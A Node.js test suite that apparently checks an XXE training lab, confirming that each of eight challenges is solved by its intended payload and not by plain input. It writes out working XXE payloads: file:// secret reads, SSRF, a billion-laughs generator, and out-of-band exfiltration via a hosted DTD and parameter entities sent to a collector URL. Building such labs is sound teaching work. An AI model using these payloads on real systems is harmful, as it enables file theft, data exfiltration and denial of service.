'use strict';
// XXE module: every challenge must be solvable by the documented technique and
// must NOT be solvable by the obvious shortcut. The two OOB challenges must
// reach the flag only through the single shared oobLog identity.
const test = require('node:test');
const assert = require('node:assert/strict');
const path = require('node:path');
const { client, bootLab, flagFromDb, capturedSet, FLAG_RE, ROOT } = require('./helpers');

// Absolute path of the module's file-read target, wherever the lab copy boots.
const SECRET_ABS = path.join(ROOT, 'modules/xxe/secret.txt');

// Classic billion-laughs shape: lol = 10 chars, each next level 10 refs,
// so lol7 expands to 10^7 chars (> 5 MB size gate) from ~500 input chars.
function billionPayload() {
  let xml = '<!DOCTYPE lolz [\n';
  xml += '<!ENTITY lol "aaaaaaaaaa">\n';
  let prev = 'lol';
  for (let i = 2; i <= 7; i++) {
    const name = `lol${i}`;
    xml += `<!ENTITY ${name} "${`&${prev};`.repeat(10)}">\n`;
    prev = name;
  }
  xml += `]>\n<data>&${prev};</data>`;
  return xml;
}

test('xxe module', async (t) => {
  const { srv, dataDir } = await bootLab(t);
  const flagOf = (id) => flagFromDb(dataDir, 'xxe', id);
  const port = new URL(srv.base).port;
  const base = `http://127.0.0.1:${port}`;

  const fileXml = (uri) => `<!DOCTYPE r [<!ENTITY xxe SYSTEM "${uri}">]><data>&xxe;</data>`;
  const importPost = (c, xml) => c.post('/xxe/import', { xml });

  await t.test('module page renders, links resolve, no em dash', async () => {
    const c = client(srv.base);
    const { status, text } = await c.get('/xxe');
    assert.equal(status, 200);
    assert.ok(!text.includes('\u2014'), 'em dash in page');
    assert.equal((text.match(/class="vuln-card"/g) || []).length, 8);
    assert.equal((text.match(FLAG_RE) || []).length, 0);
    for (const id of ['file', 'ssrf', 'xxe-billion-laughs', 'xxe-external-dtd', 'xxe-svg', 'xxe-xinclude', 'xxe-param-oob', 'xxe-soap']) {
      assert.ok(text.includes(`id="${id}"`), `anchor for ${id} missing on module page`);
    }
    for (const href of [
      '/xxe/import', '/xxe/billion', '/xxe/dtd', '/xxe/svg',
      '/xxe/xinclude', '/xxe/param', '/xxe/soap',
      '/xxe/collector', '/xxe/collector/dtd', '/xxe/collector/log',
    ]) {
      const r = await c.get(href);
      assert.notEqual(r.status, 404, href);
      assert.notEqual(r.status, 500, href);
      assert.ok(!r.text.includes('\u2014'), `em dash in ${href}`);
    }
  });

  await t.test('file: file:// entity reads the secret; a file without the marker earns nothing', async () => {
    const c = client(srv.base);
    const benign = await importPost(c, fileXml('file:///etc/hostname'));
    assert.equal(benign.status, 200);
    assert.ok(!benign.text.includes(flagOf('file')), 'file without marker must not award');
    const hit = await importPost(c, fileXml(`file://${SECRET_ABS}`));
    assert.ok(hit.text.includes(flagOf('file')));
    assert.ok((await capturedSet(c)).includes('xxe:XXE File Read'));
  });

  await t.test('ssrf: status endpoint earns nothing, internal secret via entity wins', async () => {
    const c = client(srv.base);
    const benign = await importPost(c, fileXml(`${base}/ssrf/internal/status`));
    assert.equal(benign.status, 200);
    assert.ok(!benign.text.includes(flagOf('ssrf')), 'status endpoint must not award');
    const hit = await importPost(c, fileXml(`${base}/ssrf/internal/secret`));
    assert.ok(hit.text.includes(flagOf('ssrf')));
    assert.ok((await capturedSet(c)).includes('xxe:SSRF via XXE'));
  });

  await t.test('xxe-billion-laughs: plain XML earns nothing, nested entities blow past the gate', async () => {
    const c = client(srv.base);
    const benign = await c.post('/xxe/billion', { xml: '<data>hello</data>' });
    assert.equal(benign.status, 200);
    assert.ok(!benign.text.includes(flagOf('xxe-billion-laughs')), 'plain XML must not award');
    const payload = billionPayload();
    assert.ok(payload.length <= 3000, 'payload must fit the 3000 char limit');
    const hit = await c.post('/xxe/billion', { xml: payload });
    assert.ok(hit.text.includes(flagOf('xxe-billion-laughs')));
    assert.ok((await capturedSet(c)).includes('xxe:Billion Laughs (Entity-Expansion DoS)'));
  });

  await t.test('xxe-external-dtd: no DTD earns nothing, hosted DTD exfiltrates the secret OOB', async () => {
    const c = client(srv.base);
    const benign = await c.post('/xxe/dtd', { xml: '<data>hello</data>' });
    assert.equal(benign.status, 200);
    assert.ok(!benign.text.includes(flagOf('xxe-external-dtd')), 'DTD-less XML must not award');
    // 1) Host the malicious DTD on the in-lab collector.
    const dtd = `<!ENTITY % file SYSTEM "file://${SECRET_ABS}">\n<!ENTITY pingback SYSTEM "${base}/xxe/collector/log?d=%file;">`;
    const hosted = await c.post('/xxe/collector/dtd', { dtd });
    assert.equal(hosted.status, 302, 'DTD upload should redirect to the collector page');
    const dtdGet = await c.get('/xxe/collector/dtd');
    assert.ok(dtdGet.text.includes('%file;'), 'hosted DTD should be served back');
    // 2) Import XML that pulls the hosted DTD in via a parameter entity.
    const xml = `<!DOCTYPE r [\n<!ENTITY % dtd SYSTEM "${base}/xxe/collector/dtd">\n%dtd;\n]>\n<data>&pingback;</data>`;
    const hit = await c.post('/xxe/dtd', { xml });
    assert.ok(hit.text.includes(flagOf('xxe-external-dtd')), 'OOB pingback carrying the secret must award');
    assert.ok((await capturedSet(c)).includes('xxe:External DTD Exfiltration'));
  });

  await t.test('xxe-svg: plain SVG earns nothing, DOCTYPE entity reads the secret into <text>', async () => {
    const c = client(srv.base);
    const benignSvg = '<svg xmlns="http://www.w3.org/2000/svg"><text>hello</text></svg>';
    const benign = await c.post('/xxe/svg', { svg: benignSvg });
    assert.equal(benign.status, 200);
    assert.ok(!benign.text.includes(flagOf('xxe-svg')), 'plain SVG must not award');
    const svg = `<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file://${SECRET_ABS}">]>\n<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>`;
    const hit = await c.post('/xxe/svg', { svg });
    assert.ok(hit.text.includes(flagOf('xxe-svg')));
    assert.ok((await capturedSet(c)).includes('xxe:XXE in Uploaded SVG'));
  });

  await t.test('xxe-xinclude: XML without xi:include earns nothing, file:// href is spliced in', async () => {
    const c = client(srv.base);
    const benign = await c.post('/xxe/xinclude', { xml: '<root>hello</root>' });
    assert.equal(benign.status, 200);
    assert.ok(!benign.text.includes(flagOf('xxe-xinclude')), 'XML without xi:include must not award');
    const xml = `<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file://${SECRET_ABS}" parse="text"/></root>`;
    const hit = await c.post('/xxe/xinclude', { xml });
    assert.ok(hit.text.includes(flagOf('xxe-xinclude')));
    assert.ok((await capturedSet(c)).includes('xxe:XInclude File Inclusion'));
  });

  await t.test('xxe-param-oob: plain XML earns nothing, inline parameter entities exfiltrate OOB', async () => {
    const c = client(srv.base);
    const benign = await c.post('/xxe/param', { xml: '<data>hello</data>' });
    assert.equal(benign.status, 200);
    assert.ok(!benign.text.includes(flagOf('xxe-param-oob')), 'plain XML must not award');
    // The quoting trick: outer parameter entity is double-quoted, so the
    // smuggled inner declaration uses single quotes around its URL.
    const xml = `<!DOCTYPE r [\n<!ENTITY % file SYSTEM "file://${SECRET_ABS}">\n<!ENTITY % oob "<!ENTITY exfil SYSTEM '${base}/xxe/collector/log?d=%file;'>">\n%oob;\n]>\n<data>&exfil;</data>`;
    const hit = await c.post('/xxe/param', { xml });
    assert.ok(hit.text.includes(flagOf('xxe-param-oob')), 'OOB pingback carrying the secret must award');
    assert.ok((await capturedSet(c)).includes('xxe:Parameter-Entity OOB Exfiltration'));
  });

  await t.test('xxe-soap: plain envelope earns nothing, DOCTYPE entity reads the secret into the body', async () => {
    const c = client(srv.base);
    const benignXml = '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><GetStatus>hi</GetStatus></soap:Body></soap:Envelope>';
    const benign = await c.post('/xxe/soap', { xml: benignXml });
    assert.equal(benign.status, 200);
    assert.ok(!benign.text.includes(flagOf('xxe-soap')), 'plain envelope must not award');
    const xml = `<!DOCTYPE e [<!ENTITY xxe SYSTEM "file://${SECRET_ABS}">]>\n<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><GetStatus>&xxe;</GetStatus></soap:Body></soap:Envelope>`;
    const hit = await c.post('/xxe/soap', { xml });
    assert.ok(hit.text.includes(flagOf('xxe-soap')));
    assert.ok((await capturedSet(c)).includes('xxe:XXE in SOAP Endpoint'));
  });

  await t.test('scoreboard counts each captured challenge once', async () => {
    const c = client(srv.base);
    const importXml = fileXml(`file://${SECRET_ABS}`);
    const dtd = `<!ENTITY % file SYSTEM "file://${SECRET_ABS}">\n<!ENTITY pingback SYSTEM "${base}/xxe/collector/log?d=%file;">`;
    await c.post('/xxe/collector/dtd', { dtd });
    const paramXml = `<!DOCTYPE r [\n<!ENTITY % file SYSTEM "file://${SECRET_ABS}">\n<!ENTITY % oob "<!ENTITY exfil SYSTEM '${base}/xxe/collector/log?d=%file;'>">\n%oob;\n]>\n<data>&exfil;</data>`;
    const svg = `<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file://${SECRET_ABS}">]>\n<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>`;
    const xi = `<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file://${SECRET_ABS}" parse="text"/></root>`;
    const soap = `<!DOCTYPE e [<!ENTITY xxe SYSTEM "file://${SECRET_ABS}">]>\n<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><GetStatus>&xxe;</GetStatus></soap:Body></soap:Envelope>`;
    const dtdXml = `<!DOCTYPE r [\n<!ENTITY % dtd SYSTEM "${base}/xxe/collector/dtd">\n%dtd;\n]>\n<data>&pingback;</data>`;
    const exploits = [
      ['file', () => c.post('/xxe/import', { xml: importXml })],
      ['ssrf', () => c.post('/xxe/import', { xml: fileXml(`${base}/ssrf/internal/secret`) })],
      ['xxe-billion-laughs', () => c.post('/xxe/billion', { xml: billionPayload() })],
      ['xxe-external-dtd', () => c.post('/xxe/dtd', { xml: dtdXml })],
      ['xxe-svg', () => c.post('/xxe/svg', { svg })],
      ['xxe-xinclude', () => c.post('/xxe/xinclude', { xml: xi })],
      ['xxe-param-oob', () => c.post('/xxe/param', { xml: paramXml })],
      ['xxe-soap', () => c.post('/xxe/soap', { xml: soap })],
    ];
    for (const [id, run] of exploits) {
      const r = await run();
      assert.ok(r.text.includes(flagOf(id)), `exploit for ${id} did not award`);
    }
    // Capture one challenge twice: still exactly one entry.
    await c.post('/xxe/import', { xml: importXml });
    const got = (await capturedSet(c)).filter((s) => s.startsWith('xxe:'));
    const names = [
      'xxe:XXE File Read', 'xxe:SSRF via XXE',
      'xxe:Billion Laughs (Entity-Expansion DoS)', 'xxe:External DTD Exfiltration',
      'xxe:XXE in Uploaded SVG', 'xxe:XInclude File Inclusion',
      'xxe:Parameter-Entity OOB Exfiltration', 'xxe:XXE in SOAP Endpoint',
    ];
    assert.equal(got.length, 8);
    for (const n of names) assert.equal(got.filter((s) => s === n).length, 1, n);
  });
});
